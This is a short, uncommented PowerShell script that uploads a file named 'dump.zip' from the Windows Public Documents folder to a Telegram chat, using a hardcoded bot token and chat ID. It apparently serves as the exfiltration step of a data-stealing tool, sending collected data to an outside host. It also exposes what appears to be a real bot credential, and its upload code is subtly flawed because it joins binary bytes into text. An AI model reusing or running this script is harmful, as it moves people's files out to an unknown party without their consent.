# Define the bot token, chat ID, and file path
$botToken = "7114983794:AAGyo81srw1mdAfxNSHtggO7PvEk-au038I"
$chatID = "7925642901"
$filePath = "C:\Users\Public\Documents\dump.zip"

# Verify the file exists
if (-Not (Test-Path $filePath)) {
    Write-Output "File does not exist: $filePath"
    exit
}

# Prepare the API URL
$apiUrl = "https://api.telegram.org/bot$botToken/sendDocument"

# Create a boundary for the multipart form data
$boundary = [System.Guid]::NewGuid().ToString()

# Create the multipart form data
$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"chat_id`"",
    "",
    $chatID,
    "--$boundary",
    "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $filePath -Leaf)`"",
    "Content-Type: application/octet-stream",
    "",
    [System.IO.File]::ReadAllBytes($filePath),
    "--$boundary--"
)

# Join the body lines into a single string
$body = $bodyLines -join "`r`n"

# Create the HTTP request
try {
    $response = Invoke-RestMethod -Uri $apiUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    Write-Output "Upload successful! Response: $($response | ConvertTo-Json)"
} catch {
    Write-Output "Upload failed. Error: $_"
}
